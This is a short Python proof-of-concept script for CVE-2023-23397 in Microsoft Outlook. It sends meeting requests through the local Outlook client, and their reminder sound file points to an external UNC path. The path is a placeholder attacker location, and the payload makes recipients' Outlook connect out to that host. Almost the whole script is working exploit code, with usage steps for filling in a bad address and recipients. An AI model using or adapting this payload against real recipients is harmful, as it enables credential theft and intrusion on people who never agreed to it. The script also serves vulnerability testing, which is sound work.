#!/usr/bin/env python3
"""
cve-2023-23397.py:
This script provides a class to interact with the Microsoft Outlook thick client using the win32com library.
It allows the user to create and send meeting requests with various custom settings. The primary use
case demonstrated in this script is to test a vulnerability (CVE-2023-23397) by specifying an external
UNC location as the reminder sound file.

The OutlookClient class has the following methods:
- init(): Initializes the OutlookClient object by creating a Dispatch object for Outlook.Application.
- send_meeting_request(): Sends a meeting request with specified subject, time, location, recipients,
  body, and bad_location (UNC path) for the reminder sound file.

Usage:
1. Replace the BAD_ADDRESS variable with the desired UNC path for the external resource.
2. Set the MEETING_SUBJECT, MEETING_BODY_TEXT, MEETING_RECIPIENTS, and other variables as needed.
3. Run the script to send the meeting request with the locally installed outlook thick client.

Note: This script uses the win32com.client library, which is Windows specific and requires the pywin32 package.

Relevant links:
CVE info - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397

API Docs:
https://learn.microsoft.com/en-us/office/vba/api/outlook.appointmentitem
https://learn.microsoft.com/en-us/office/vba/api/outlook.appointmentitem.reminderoverridedefault
https://learn.microsoft.com/en-us/office/vba/api/outlook.appointmentitem.remindersoundfile
"""

__author__ = "William Golembieski"
__license__ = "Apache License 2.0"
__email__ = "william@armoryanalytics.com"

import win32com.client

OUTLOOK_FORMAT = '%m/%d/%Y %H:%M'
def outlook_date(dt): return dt.strftime(OUTLOOK_FORMAT)


class OutlookClient(object):
    def __init__(self):
        self.outlook = win32com.client.Dispatch('Outlook.Application')

    def send_meeting_request(self, subject, time, location, recipients, body, bad_location):
        mtg = self.outlook.CreateItem(1)
        mtg.MeetingStatus = 1
        mtg.Location = location
        for recipient in recipients:
            mtg.Recipients.Add(recipient)
        mtg.Subject = subject
        mtg.Start = outlook_date(time)
        mtg.Duration = 60
        mtg.ReminderMinutesBeforeStart = 30
        mtg.ResponseRequested = False
        mtg.Body = body
        mtg.ReminderSet = True
        mtg.ReminderOverrideDefault = True
        mtg.ReminderSoundFile = bad_location
        mtg.Save()
        mtg.Send()


if __name__ == "__main__":
    MEETING_SUBJECT:      str = "Test Of CVE-2023-23397"
    MEETING_BODY_TEXT:    str = "CVE-2023-23397 Test email"
    MEETING_LOCATION:     str = "Virtual"
    MEETING_RECIPIENTS: [str] = [
        'user@test.com',
        'user2@test.com'
    ]

    # External UNC location
    BAD_ADDRESS: str = "\\\\<your>.<bad>.<location>.<here>\\@<port>\\<file>.<extension>"

    import datetime
    ol = OutlookClient()

    # Set meeting time 3 hours from now
    meeting_time = datetime.datetime.now() + datetime.timedelta(hours=3)

    ol.send_meeting_request(MEETING_SUBJECT, meeting_time, MEETING_LOCATION, MEETING_RECIPIENTS, MEETING_BODY_TEXT,
                            BAD_ADDRESS)
